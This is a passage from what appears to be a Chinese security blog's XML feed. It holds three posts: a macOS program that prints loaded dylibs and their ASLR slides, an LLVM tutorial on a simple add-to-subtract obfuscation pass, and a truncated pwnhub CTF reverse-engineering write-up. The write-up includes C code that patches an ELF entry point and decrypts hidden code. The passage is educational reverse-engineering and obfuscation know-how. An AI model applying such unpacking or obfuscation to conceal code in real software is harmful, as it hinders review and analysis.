      <category term="一点一点" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/%E4%B8%80%E7%82%B9%E4%B8%80%E7%82%B9/"/>
    
    
      <category term="macOS" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/macOS/"/>
    
  </entry>
  
  <entry>
    <title>遍历自身加载的dylib获取载入地址和ASLR地址</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/08/01/%E9%81%8D%E5%8E%86%E8%87%AA%E8%BA%AB%E5%8A%A0%E8%BD%BD%E7%9A%84dylib%E8%8E%B7%E5%8F%96%E8%BD%BD%E5%85%A5%E5%9C%B0%E5%9D%80%E5%92%8CASLR%E5%9C%B0%E5%9D%80%E7%AD%89/%E9%81%8D%E5%8E%86%E8%87%AA%E8%BA%AB%E5%8A%A0%E8%BD%BD%E7%9A%84dylib%E8%8E%B7%E5%8F%96%E8%BD%BD%E5%85%A5%E5%9C%B0%E5%9D%80%E5%92%8CASLR%E5%9C%B0%E5%9D%80%E7%AD%89/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/08/01/遍历自身加载的dylib获取载入地址和ASLR地址等/遍历自身加载的dylib获取载入地址和ASLR地址等/</id>
    <published>2017-08-01T08:27:59.000Z</published>
    <updated>2017-08-02T08:39:50.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><blockquote><p>通过macho/dyld.h提供的函数，程序可以获取到自身加载的dylib信息，这里做个简单记录</p></blockquote></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">#include&lt;stdio.h&gt;</div><div class="line">#include &lt;mach-o/dyld.h&gt;</div><div class="line"></div><div class="line">void getDylibInfo()</div><div class="line">&#123;</div><div class="line">    printf(&quot;*****Created by 4ch12dy*****\nDyld image count is: %d.\n&quot;, _dyld_image_count());</div><div class="line">    for (int i = 0; i &lt; _dyld_image_count(); i++) &#123;</div><div class="line">        char *image_name = (char *)_dyld_get_image_name(i);</div><div class="line">        const struct mach_header *mh = _dyld_get_image_header(i);</div><div class="line">        intptr_t vmaddr_slide = _dyld_get_image_vmaddr_slide(i);</div><div class="line">        </div><div class="line">        printf(&quot;Image name %s at address 0x%llx and ASLR slide 0x%lx.\n&quot;,</div><div class="line">               image_name, (mach_vm_address_t)mh, vmaddr_slide);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main(int argc, char *argv[]) &#123;</div><div class="line">getDylibInfo();</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line">*****Created by 4ch12dy*****  </div><div class="line">Dyld image count is: 41.  </div><div class="line">Image name /Users/king/Desktop/./dylibinfo at address 0x106a5c000 and ASLR slide 0x6a5c000.  </div><div class="line">Image name /usr/lib/libSystem.B.dylib at address 0x7fff8a0e2000 and ASLR slide 0x991c000.  </div><div class="line">Image name /usr/lib/system/libcache.dylib at address 0x7fff89c95000 and ASLR slide 0x991c000.  </div><div class="line">Image name /usr/lib/system/libcommonCrypto.dylib at address 0x7fff8fc8d000 and ASLR slide 0x991c000.  </div><div class="line">Image name /usr/lib/system/libcompiler_rt.dylib at address 0x7fff95695000 and ASLR slide 0x991c000.  </div><div class="line">Image name /usr/lib/system/libcopyfile.dylib at address 0x7fff911fd000 and ASLR slide 0x991c000.  </div><div class="line">Image name /usr/lib/system/libcorecrypto.dylib at address 0x7fff8ebd2000 and ASLR slide 0x991c000.  </div><div class="line">Image name /usr/lib/system/libdispatch.dylib at address 0x7fff8fd49000 and ASLR slide 0x991c000.  </div><div class="line">Image name /usr/lib/system/libdyld.dylib at address 0x7fff97fcc000 and ASLR slide 0x991c000.  </div><div class="line">Image name /usr/lib/system/libkeymgr.dylib at address 0x7fff8a8dd000 and ASLR slide 0x991c000.  </div><div class="line">Image name /usr/lib/system/liblaunch.dylib at address 0x7fff925b2000 and ASLR slide 0x991c000.  </div><div class="line">Image name /usr/lib/system/libmacho.dylib at address 0x7fff9e2af000 and ASLR slide 0x991c000.  </div><div class="line">Image name /usr/lib/system/libquarantine.dylib at address 0x7fff9673a000 and ASLR slide 0x991c000.  </div><div class="line">Image name /usr/lib/system/libremovefile.dylib at address 0x7fff93a7f000 and ASLR slide 0x991c000.  </div><div class="line">Image name /usr/lib/system/libsystem_asl.dylib at address 0x7fff9252f000 and ASLR slide 0x991c000.  </div><div class="line">Image name /usr/lib/system/libsystem_blocks.dylib at address 0x7fff9354c000 and ASLR slide 0x991c000.  </div><div class="line">Image name /usr/lib/system/libsystem_c.dylib at address 0x7fff954f7000 and ASLR slide 0x991c000.  </div><div class="line">Image name /usr/lib/system/libsystem_configuration.dylib at address 0x7fff90772000 and ASLR slide 0x991c000.  </div><div class="line">Image name /usr/lib/system/libsystem_coreservices.dylib at address 0x7fff8ca80000 and ASLR slide 0x991c000.  </div><div class="line">Image name /usr/lib/system/libsystem_coretls.dylib at address 0x7fff934e8000 and ASLR slide 0x991c000.  </div><div class="line">Image name /usr/lib/system/libsystem_dnssd.dylib at address 0x7fff917b2000 and ASLR slide 0x991c000.  </div><div class="line">Image name /usr/lib/system/libsystem_info.dylib at address 0x7fff921dc000 and ASLR slide 0x991c000.  </div><div class="line">Image name /usr/lib/system/libsystem_kernel.dylib at address 0x7fff962e9000 and ASLR slide 0x991c000.  </div><div class="line">Image name /usr/lib/system/libsystem_m.dylib at address 0x7fff9ea96000 and ASLR slide 0x991c000.  </div><div class="line">Image name /usr/lib/system/libsystem_malloc.dylib at address 0x7fff9c890000 and ASLR slide 0x991c000.  </div><div class="line">Image name /usr/lib/system/libsystem_network.dylib at address 0x7fff8c945000 and ASLR slide 0x991c000.  </div><div class="line">Image name /usr/lib/system/libsystem_networkextension.dylib at address 0x7fff91223000 and ASLR slide 0x991c000.  </div><div class="line">Image name /usr/lib/system/libsystem_notify.dylib at address 0x7fff97081000 and ASLR slide 0x991c000.  </div><div class="line">Image name /usr/lib/system/libsystem_platform.dylib at address 0x7fff8fb26000 and ASLR slide 0x991c000.  </div><div class="line">Image name /usr/lib/system/libsystem_pthread.dylib at address 0x7fff971ba000 and ASLR slide 0x991c000.  </div><div class="line">Image name /usr/lib/system/libsystem_sandbox.dylib at address 0x7fffa00c8000 and ASLR slide 0x991c000.  </div><div class="line">Image name /usr/lib/system/libsystem_secinit.dylib at address 0x7fff93708000 and ASLR slide 0x991c000.  </div><div class="line">Image name /usr/lib/system/libsystem_trace.dylib at address 0x7fff9a886000 and ASLR slide 0x991c000.  </div><div class="line">Image name /usr/lib/system/libunc.dylib at address 0x7fff93f3e000 and ASLR slide 0x991c000.  </div><div class="line">Image name /usr/lib/system/libunwind.dylib at address 0x7fff9fcd4000 and ASLR slide 0x991c000.  </div><div class="line">Image name /usr/lib/system/libxpc.dylib at address 0x7fff9abfe000 and ASLR slide 0x991c000.  </div><div class="line">Image name /usr/lib/libobjc.A.dylib at address 0x7fff8deaa000 and ASLR slide 0x991c000.  </div><div class="line">Image name /usr/lib/libauto.dylib at address 0x7fff9feb1000 and ASLR slide 0x991c000.  </div><div class="line">Image name /usr/lib/libc++abi.dylib at address 0x7fff90b13000 and ASLR slide 0x991c000.  </div><div class="line">Image name /usr/lib/libc++.1.dylib at address 0x7fff97f75000 and ASLR slide 0x991c000.  </div><div class="line">Image name /usr/lib/libDiagnosticMessagesClient.dylib at address 0x7fff99766000 and ASLR slide 0x991c000.</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;通过macho/dyld.h提供的函数，程序可以获取到自身加载的dylib信息，这里做个简单记录&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;figure class=&quot;highlight plain
      
    
    </summary>
    
      <category term="macho/dyld" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/macho-dyld/"/>
    
    
      <category term="dyld" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/dyld/"/>
    
      <category term="macho" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/macho/"/>
    
  </entry>
  
  <entry>
    <title>初-LLVM的代码混淆</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/06/25/%E5%88%9D-LLVM%E7%9A%84%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/%E5%88%9D-LLVM%E7%9A%84%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/06/25/初-LLVM的代码混淆/初-LLVM的代码混淆/</id>
    <published>2017-06-25T07:09:13.000Z</published>
    <updated>2017-06-25T13:14:42.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-目录"><a href="#0x00-目录" class="headerlink" title="0x00 目录"></a>0x00 目录</h2><blockquote><blockquote><p>断断续续的学习了一段时间的LLVM，记录下学习进度，随着后面的学习待更新</p></blockquote></blockquote><ul><li>LLVM简介</li><li>一个基于LLVM简单的代码混淆例子</li><li>参考链接</li></ul><h2 id="0x01-LLVM简介"><a href="#0x01-LLVM简介" class="headerlink" title="0x01 LLVM简介"></a>0x01 LLVM简介</h2><p>LLVM(low level virtual machine)是一个先进的编译器框架，它提供了一种代码编写良好的中间表示(IR)，可以作为多种语言的后端，还可以提供与变成语言无关的优化和针对多种cpu的代码生成功能。<br>LLVM的主要架构如下：</p><ul><li>前端：前端用来获取源代码然后将它转变为某种中间表示，我们可以选择不同的编译器来作为LLVM的前端，如gcc，clang。</li><li>Pass：Pass是LLVM优化工作的一个节点，一个节点做些事，一起加起来就构成了LLVM完整的优化和转化。</li><li>后端：后端用来生成实际的机器码，一般情况下不会关注这一部分。</li></ul><h3 id="LLVM框架："><a href="#LLVM框架：" class="headerlink" title="LLVM框架："></a>LLVM框架：</h3><p><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/LLVM/0-0.png?raw=true" alt="0-0"><br>这里与传统的编译器不同，LLVM采用了一种统一的中间表示：<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/LLVM/0-1.png?raw=true" alt="0-1"></p><h3 id="安装与使用"><a href="#安装与使用" class="headerlink" title="安装与使用"></a>安装与使用</h3><p>首先下载LLVM  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ cd where-you-want-llvm-to-live</div><div class="line">$ svn co http://llvm.org/svn/llvm-project/llvm/trunk llvm</div></pre></td></tr></table></figure><p>我们选择clang作为LLVM前端，然后下载clang  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ cd where-you-want-llvm-to-live</div><div class="line">$ cd llvm/tools</div><div class="line">$ svn co http://llvm.org/svn/llvm-project/cfe/trunk clang</div></pre></td></tr></table></figure><p>下载编译运行库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ cd where-you-want-llvm-to-live</div><div class="line">$ cd llvm/projects</div><div class="line">$ svn co http://llvm.org/svn/llvm-project/compiler-rt/trunk compiler-rt</div></pre></td></tr></table></figure><p>最后编译LLVM源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ mkdir build</div><div class="line">$ cd build</div><div class="line">$ cmake -DCMAKE_BUILD_TYPE:String=Release ../llvm/</div><div class="line">$ make</div></pre></td></tr></table></figure><p>编译时间可能有点长，编译完成之后进行安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$sudo make install</div></pre></td></tr></table></figure><p>接下来就是LLVM的使用，先创建一个hello.c源文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">int main()&#123;</div><div class="line">    printf(&quot;hello LLVM\n&quot;);</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="0x02-一个基于LLVM简单的代码混淆例子"><a href="#0x02-一个基于LLVM简单的代码混淆例子" class="headerlink" title="0x02 一个基于LLVM简单的代码混淆例子"></a>0x02 一个基于LLVM简单的代码混淆例子</h2><p>Pass是LLVM中一个很重要的部分，每个Pass都是做优化或者转换的工作，LLVM的优化和转换工作就是由很多个Pass一起完成的。我们通过继承指定的类以及实现相关的虚函数来实现具体的Pass，具体的类型主要有以下几种：  </p><ul><li>ImmutablePass</li><li>MoudlePass</li><li>CallGraphSCCPass</li><li>FuncationPass</li><li>LoopPass</li><li>RegionPass</li><li>BasicBlockPass</li><li>MachineFunctionPass</li></ul><p>下面这个例子来介绍一下pass的编写并达到简单的混淆。从这里下载这个模板<a href="https://github.com/NULL-ME/NULL-ME.github.io/tree/master/articlePic/LLVM/skeleton">llvm-pass-skeleton</a></p><p>下面是完整代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line">#include &quot;llvm/Pass.h&quot;</div><div class="line">#include &quot;llvm/IR/Function.h&quot;</div><div class="line">#include &quot;llvm/Support/raw_ostream.h&quot;</div><div class="line">#include &quot;llvm/IR/LegacyPassManager.h&quot;</div><div class="line">#include &quot;llvm/Transforms/IPO/PassManagerBuilder.h&quot;</div><div class="line">#include &quot;llvm/IR/Intrinsics.h&quot;</div><div class="line">#include &quot;llvm/IR/Instructions.h&quot;</div><div class="line"></div><div class="line">using namespace llvm;</div><div class="line"></div><div class="line">namespace &#123;</div><div class="line">  struct SkeletonPass : public FunctionPass &#123;</div><div class="line">    static char ID;</div><div class="line">    SkeletonPass() : FunctionPass(ID) &#123;&#125;</div><div class="line"></div><div class="line">    // virtual bool runOnFunction(Function &amp;F) &#123;</div><div class="line">    //   errs() &lt;&lt; &quot;I saw a function called &quot; &lt;&lt; F.getName() &lt;&lt; &quot;!\n&quot;;</div><div class="line">    //   return false;</div><div class="line">    // &#125;</div><div class="line">    bool runOnFunction(Function &amp;F) override &#123;</div><div class="line">            Function *tmp = &amp;F;</div><div class="line">            // 遍历函数中的所有基本块</div><div class="line">            for (Function::iterator bb = tmp-&gt;begin(); bb != tmp-&gt;end(); ++bb) &#123;</div><div class="line">                // 遍历基本块中的每条指令</div><div class="line">                for (BasicBlock::iterator inst = bb-&gt;begin(); inst != bb-&gt;end(); ++inst) &#123;</div><div class="line">                    // 是否是add指令</div><div class="line">                    if (inst-&gt;isBinaryOp()) &#123;</div><div class="line">                        if (inst-&gt;getOpcode() == Instruction::Add) &#123;</div><div class="line">                            ob_add(cast&lt;BinaryOperator&gt;(inst));</div><div class="line">                        &#125;</div><div class="line">                    &#125;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">             </div><div class="line">            return false;</div><div class="line">        &#125;</div><div class="line">         </div><div class="line">        // a+b === a-(-b)</div><div class="line">        bool ob_add(BinaryOperator *bo) &#123;</div><div class="line">            BinaryOperator *op = NULL;</div><div class="line">             </div><div class="line">            if (bo-&gt;getOpcode() == Instruction::Add) &#123;</div><div class="line">                // 生成 (－b)</div><div class="line">                op = BinaryOperator::CreateNeg(bo-&gt;getOperand(1), &quot;&quot;, bo);</div><div class="line">                // 生成 a-(-b)</div><div class="line">                op = BinaryOperator::Create(Instruction::Sub, bo-&gt;getOperand(0), op, &quot;&quot;, bo);</div><div class="line">                 </div><div class="line">                op-&gt;setHasNoSignedWrap(bo-&gt;hasNoSignedWrap());</div><div class="line">                op-&gt;setHasNoUnsignedWrap(bo-&gt;hasNoUnsignedWrap());</div><div class="line">            &#125;</div><div class="line">             </div><div class="line">            // 替换所有出现该指令的地方</div><div class="line">            bo-&gt;replaceAllUsesWith(op);</div><div class="line">        &#125;</div><div class="line">  &#125;;</div><div class="line">&#125;</div><div class="line"></div><div class="line">char SkeletonPass::ID = 0;</div><div class="line"></div><div class="line">// Automatically enable the pass.</div><div class="line">// http://adriansampson.net/blog/clangpass.html</div><div class="line">static void registerSkeletonPass(const PassManagerBuilder &amp;,</div><div class="line">                         legacy::PassManagerBase &amp;PM) &#123;</div><div class="line">  PM.add(new SkeletonPass());</div><div class="line">&#125;</div><div class="line">static RegisterStandardPasses</div><div class="line">  RegisterMyPass(PassManagerBuilder::EP_EarlyAsPossible,</div><div class="line">                 registerSkeletonPass);</div></pre></td></tr></table></figure><p>通过继承<code>FunctionPass</code>重写虚函数<code>runOnFunction</code>来到达我们代码混淆的目的，再看关键的混淆部分，如下面注释那样，找到函数中的add指令，并将其改为sub指令。如<code>a+b</code>经过混淆为<code>a-(-b)</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">bool runOnFunction(Function &amp;F) override &#123;</div><div class="line">            Function *tmp = &amp;F;</div><div class="line">            // 遍历函数中的所有基本块</div><div class="line">            for (Function::iterator bb = tmp-&gt;begin(); bb != tmp-&gt;end(); ++bb) &#123;</div><div class="line">                // 遍历基本块中的每条指令</div><div class="line">                for (BasicBlock::iterator inst = bb-&gt;begin(); inst != bb-&gt;end(); ++inst) &#123;</div><div class="line">                    // 是否是add指令</div><div class="line">                    if (inst-&gt;isBinaryOp()) &#123;</div><div class="line">                        if (inst-&gt;getOpcode() == Instruction::Add) &#123;</div><div class="line">                            ob_add(cast&lt;BinaryOperator&gt;(inst));</div><div class="line">                        &#125;</div><div class="line">                    &#125;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">             </div><div class="line">            return false;</div><div class="line">        &#125;</div></pre></td></tr></table></figure><p>代码很简单，这里就不多说。我们使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$clang -Xclang -load -Xclang build/skeleton/libSkeletonPass.* something.c</div></pre></td></tr></table></figure><p>来运行这个pass编译成目标可执行文件<br>现在我们创建一个addTest.c文件来测试是否代码混淆</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line"></div><div class="line">int func(int a,int b)</div><div class="line">&#123;</div><div class="line">return a + b;</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">int c;</div><div class="line">c = func(6,9);</div><div class="line">printf(&quot;%d\n&quot;,c);</div><div class="line">return c;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>先按照一般的编译源代码，查看关键汇编代码：<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/LLVM/0-2.png?raw=true" alt="0-2"><br>然后运行我们的pass进行编译<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/LLVM/0-3.png?raw=true" alt="0-3"><br>很明显，汇编代码发生了改变，当然这里仅仅是一个简单的混淆，感兴趣的可以研究下<a href="https://github.com/obfuscator-llvm">obfuscator-llvm</a>这个项目。</p><h2 id="0x03-参考链接"><a href="#0x03-参考链接" class="headerlink" title="0x03 参考链接"></a>0x03 参考链接</h2><p><a href="http://www.tuicool.com/articles/2meqIjq" target="_blank" rel="external">深入剖析 iOS 编译 Clang / LLVM</a><br><a href="http://zke1ev3n.me/2016/01/18/%E5%9F%BA%E4%BA%8ELLVM%E7%9A%84%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/" target="_blank" rel="external">http://zke1ev3n.me/2016/01/18/%E5%9F%BA%E4%BA%8ELLVM%E7%9A%84%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-目录&quot;&gt;&lt;a href=&quot;#0x00-目录&quot; class=&quot;headerlink&quot; title=&quot;0x00 目录&quot;&gt;&lt;/a&gt;0x00 目录&lt;/h2&gt;&lt;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;断断续续的学习了一段时间的LLVM，记录下学习进
      
    
    </summary>
    
      <category term="llvm" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/llvm/"/>
    
    
      <category term="llvm" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/llvm/"/>
    
      <category term="obfuscation" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/obfuscation/"/>
    
  </entry>
  
  <entry>
    <title>pwnhub-CTF re150</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/05/28/pwnhub-CTF-re150/pwnhub-CTF-re150/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/05/28/pwnhub-CTF-re150/pwnhub-CTF-re150/</id>
    <published>2017-05-28T01:16:13.000Z</published>
    <updated>2017-05-31T02:31:59.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-写在前面"><a href="#0x00-写在前面" class="headerlink" title="0x00 写在前面"></a>0x00 写在前面</h2><p>第一次做pwnhub题，最近参加了几场ctf比赛，pwnhub的题还是比较有一定难度的，这里记录下其中的一道逆向题。题目在<a href="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/pwnhub-CTF-re150/re150?raw=true">这里</a></p><h2 id="0x01-简单分析"><a href="#0x01-简单分析" class="headerlink" title="0x01 简单分析"></a>0x01 简单分析</h2><p>拿到题目后试着在虚拟机里运行了一下，看下有什么提示<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/pwnhub-CTF-re150/0-0.png?raw=true" alt="0-0"></p><p>然后转去hopper搜下相关字符串，并没有发现<code>error</code>相关字符串，syclover也没有相关<code>printf</code>等函数输出，看来只能上gdb调试看看。</p><p>发现程序里面有多处花指令以及隐藏了程序入口。<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/pwnhub-CTF-re150/0-1.png?raw=true" alt="0-0"></p><p>由上图可以发现syclover直接由<code>int 0x80</code>系统调用中断输出到屏幕，下面是一个循环解密，后面可知解密的正是程序的入口。</p><p>由<code>__libc_start_main</code>函数可得第一个参数即为<code>main</code>函数地址<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/pwnhub-CTF-re150/0-2.png?raw=true" alt="0-0"><br>这里作为对比，可以看下hopper中对<code>0x8048320</code>main函数的解析<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/pwnhub-CTF-re150/0-3.png?raw=true" alt="0-0"><br>完全不知道是什么有木有？所以拿到题如果放到IDA之类的反汇编工具根本看不出什么线索</p><p>接下来所做的事就是获取输入的字符串然后进行加密，然后与程序里的字符串加密比较，具体看后面的代码。</p><h2 id="0x02-修复程序"><a href="#0x02-修复程序" class="headerlink" title="0x02 修复程序"></a>0x02 修复程序</h2><p>根据上面的分析，我们将程序进行修复</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;fcntl.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line">#include &lt;assert.h&gt;</div><div class="line">#include &lt;elf.h&gt;</div><div class="line">#define ENTRY 0x08048320</div><div class="line">#define FILE_OFF 0x320</div><div class="line">#define COUNT 0x432</div><div class="line">int main(int argc,char *argv[])&#123;</div><div class="line">    </div><div class="line">    Elf32_Ehdr ehdr;</div><div class="line">    unsigned char buf[COUNT] = &#123;0&#125;;</div><div class="line">    assert(argc == 2);</div><div class="line">    int fd = open(argv[1],O_RDWR);//打开文件</div><div class="line">    assert(fd&gt;0);</div><div class="line">    </div><div class="line">assert(lseek(fd,0,SEEK_SET)!=-1);// 读取elf头</div><div class="line">assert(read(fd,&amp;ehdr,sizeof(ehdr)) == sizeof(ehdr)); </div><div class="line">ehdr.e_entry = ENTRY;//修改入口地址  </div><div class="line"></div><div class="line">assert(lseek(fd,0,SEEK_SET)!=-1);//回写elf头</div><div class="line">assert(write(fd,&amp;ehdr,sizeof(ehdr)) == sizeof(ehdr));  </div><div class="line">   </div><div class="line">    //解密</div><div class="line">    assert(lseek(fd,FILE_OFF,SEEK_SET)!=-1);//读取被加密的代码</div><div class="line">    assert(read(fd,buf,COUNT) == COUNT);</div><div class="line">    int i = 0;</div><div class="line">    while(i&lt;COUNT)&#123;</div><div class="line">        buf[i] = (buf[i]^66)&lt;&lt;5 | (buf[i]^66)&gt;&gt;3;</div><div class="line"> i++; </div><div class="line">&#125;</div><div class="line"></div><div class="line">    assert(lseek(fd,FILE_OFF,SEEK_SET)!=-1);//写入正确代码</div><div class="line">    assert(write(fd,buf,COUNT) == COUNT);</div></pre></td></tr></table></figure><h2 id="0x03-分析算法计算flag"><a href="#0x03-分析算法计算flag" class="headerlink" title="0x03 分析算法计算flag"></a>0x03 分析算法计算flag</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/python</div><div class="line"># -*- coding: UTF-8 -*-</div><div class="line">from __future__ import print_function  </div><div class="line">import sys</div><div class="line">def getflag():</div><div class="line">    print(&quot;[i]start to encrypt key&quot;)</div><div class="line">        </div><div class="line">    key = [0x73,0x8d,0xf2,0x4c,0xc7,0xd4,0x7b,0xf7,0x18,0x32,0x71,0x0d,0xcf,0xdc,0x67,0x4f,0x7f,0x0b,0x6d]</div><div class="line">    encryptKey = []</div><div class="line">        